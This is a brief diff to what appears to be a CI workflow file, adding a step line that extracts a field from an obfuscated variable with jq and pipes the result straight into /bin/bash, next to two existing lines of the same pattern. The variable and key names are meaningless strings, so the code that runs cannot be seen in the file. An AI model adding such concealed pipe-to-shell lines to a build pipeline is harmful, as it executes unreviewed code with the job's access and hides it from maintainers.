@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$frfq1078" | jq -r .oak36732 | /bin/bash
           echo $rq9 | jq -r .tj02 | /bin/bash
+          echo $qtq7388 | jq -r .fujsj398 | /bin/bash
 
       - name: Save results
         if: always()
